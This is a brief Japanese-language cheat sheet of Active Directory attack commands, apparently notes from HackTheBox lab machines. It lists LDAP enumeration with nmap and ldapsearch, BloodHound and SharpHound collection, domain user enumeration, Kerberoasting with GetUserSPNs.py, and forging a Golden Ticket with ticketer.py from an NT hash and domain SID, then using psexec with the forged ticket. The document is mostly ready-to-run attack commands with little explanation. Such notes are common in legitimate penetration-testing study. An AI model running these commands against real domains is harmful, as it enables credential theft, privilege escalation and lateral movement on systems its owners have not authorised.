# Ldap

### nmap

    sudo nmap -sVC -vv -n -Pn -p389,3268 --script "safe and  *ldap*" 10.129.138.203

### 匿名検索

    ldapsearch -x -H ldap://10.129.138.203/
    ldapsearch -x -H ldap://10.129.138.203:3268/  
    ldapsearch -h 10.129.1.77 -x -s -b "DC=htb,DC=local"
    ldapsearch -h 10.129.1.77 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName

# BloodHound

neo4jの起動

    sudo neo4j console

browserでneo4jへ接続

    http://localhost:7474/
    databeseURL bolt：//localhost：7687
    username neo4j
    password neo4j

bloodhoundの起動

    bloodhound
1. SharpHound.exeをアップロードする。
2. `SharpHound.exe -c all`で情報収集
3. 作成したzipファイルをkaliへ転送して、Bloodhoundにアップロード
4. 左のフィルターで取得したユーザを選択して、pwn済みのアイコンを付けて、Analysisで分析
![bloodhound_1](/images/bloodhound_1.jpg)

# Domainユーザの列挙
    GetADUsers.py -all -dc-ip 10.129.138.203 active.htb/SVC_TGS

# Kerberosting
SPNがわかっているとSPNへの接続のためのサービスチケットを要求することができる。そのチケットをローカルメモリから取り出してサービスチケットのクラッキングをする。
    GetUserSPNs.py -request -dc-ip 10.129.138.203 active.htb/SVC_TGS


# Golden Ticket
    python /opt/impacket/build/scripts-2.7/ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local netexist

    export KRB5CCNAME=notexist.ccache

    psexec.py htb.local/notexist@forest -k -no-pass -debug

[Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
